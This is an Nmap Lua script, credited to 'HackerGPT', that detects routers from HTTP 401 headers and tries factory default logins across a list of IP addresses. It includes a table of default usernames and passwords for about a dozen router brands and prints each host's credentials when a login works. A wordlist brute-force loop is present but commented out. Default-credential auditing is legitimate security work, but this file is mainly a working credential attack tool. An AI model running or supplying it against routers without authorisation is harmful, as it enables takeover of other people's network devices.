local nmap = require "nmap"
local shortport = require "shortport"
local brute = require "brute"
local stdnse = require "stdnse"
local unpwdb = require "unpwdb"
local http = require "http"

-- Define the script details
description = [[
    Script to identify router devices and brute force login using default factory credentials first, followed by credentials from a file.
    Usage:
    nmap --script nmap_router_brute.lua --script-args "userdb=path/to/usernames.txt,passdb=path/to/passwords.txt" -iL ip_list.txt
]]

author = "HackerGPT"
license = "Same as Nmap"
categories = {"brute", "auth"}

-- Define user options
portrule = shortport.port_or_service({80, 443}, {"http", "https"})

-- Factory default credentials for common routers
local default_creds = {
    ["zyxel"] = {username="admin", password="1234"},
    ["tp-link"] = {username="admin", password="admin"},
    ["keenetic"] = {username="admin", password="admin"},
    ["d-link"] = {username="admin", password="admin"},
    ["netgear"] = {username="admin", password="password"},
    ["huawei"] = {username="admin", password="admin"},
    ["asus"] = {username="admin", password="admin"},
    ["mikrotik"] = {username="admin", password=""},
    ["tenda"] = {username="admin", password="admin"},
    ["eltex"] = {username="admin", password="admin"},
    ["netis"] = {username="admin", password="admin"}
}

-- Function to determine if the device is a router based on HTTP headers
local function is_router(host, port)
    local response, err = http.get(host, port, "/")

    -- Gracefully handle TCP errors
    if not response then
        return false
    end

    if response and response.status == 401 then  -- Look for HTTP 401 Unauthorized
        -- Safely convert headers to strings before checking
        local server_header = tostring(response.header["server"] or "nil")
        local www_authenticate_header = tostring(response.header["www-authenticate"] or "nil")

        -- Check for common router models in the WWW-Authenticate and Server headers
        for router_model, creds in pairs(default_creds) do
            if server_header:lower():find(router_model) or www_authenticate_header:lower():find(router_model) then
                stdnse.print_debug(1, "Identified router as: %s", router_model)
                return router_model
            end
        end
    end

    return false
end

-- Define a brute-force driver for HTTP Basic/Digest authentication
local Driver = {
    login = function(host, port, username, password)
        -- Perform the HTTP request with Basic or Digest authentication
        local response = http.get(host, port, "/", {
            auth = {
                username = username,
                password = password,
                type = "digest"  -- or "basic", depending on the router
            }
        })

        -- Manually define success/failure status
        if response and response.status == 200 then
            return true  -- Success
        else
            return false  -- Failure
        end
    end
}

-- Brute-force authentication function
local function brute_force(host, port, router_model, user_file, pass_file)
    local attempts = 0
    local try = nmap.new_try()  -- For exception handling

    -- 1. Try default credentials first if available
    if router_model and default_creds[router_model] then
        local username = default_creds[router_model].username
        local password = default_creds[router_model].password

        stdnse.print_debug(1, "Trying default credentials: %s / %s", username, password)
        print("Host: " .. tostring(host.ip) .. " - Router Model: " .. router_model .. " - Username: " .. username .. " - Password: " .. password)
            
        local success = Driver.login(host, port, username, password)

        if success then
            stdnse.print_debug(1, "Successfully logged in using default credentials for host %s", host.ip)
            print("Host: " .. tostring(host.ip) .. " - Username: " .. username .. " - Password: " .. password)
            return true
        else
            stdnse.print_debug(1, "Failed to log in with default credentials for host %s", host.ip)
        end
    end

    -- 2. Try user-provided credentials from the user file
    -- Use unpwdb.usernames() and unpwdb.passwords() with proper handling
    -- local usernames_closure = try(unpwdb.usernames())
    -- local passwords_closure = try(unpwdb.passwords())

    -- for password in passwords_closure do
    --     for username in usernames_closure do
    --         stdnse.print_debug(1, "Trying user-provided credentials: %s / %s", username, password)

    --         local success = Driver.login(host, port, username, password)

    --         if success then
    --             stdnse.print_debug(1, "Successfully logged in with user-provided credentials for host %s", host.ip)
    --             print("Host: " .. tostring(host.ip) .. " - Username: " .. username .. " - Password: " .. password)
    --             return true
    --         else
    --             stdnse.print_debug(1, "Failed to log in with credentials %s / %s for host %s", username, password, host.ip)
    --         end
    --     end
    --     usernames_closure("reset")  -- Reset the username list for the next password
    -- end

    return false
end

-- Main action function
action = function(host, port)
    -- Get script arguments (user-provided credentials)
    local user_file = stdnse.get_script_args("userdb") or "usernames.txt"
    local pass_file = stdnse.get_script_args("passdb") or "passwords.txt"

    local router_model = is_router(host, port)
    if router_model then
        stdnse.print_debug(1, "Host %s identified as a router (%s). Starting brute force attempt.", tostring(host.ip), router_model)

        local success = brute_force(host, port, router_model, user_file, pass_file)
        if success then
            stdnse.print_debug(1, "Brute force succeeded for host %s", tostring(host.ip))
        else
            stdnse.print_debug(1, "Brute force attempt failed for host %s", tostring(host.ip))
        end
    else
        stdnse.print_debug(1, "Host %s is not identified as a router.", tostring(host.ip))
    end
end
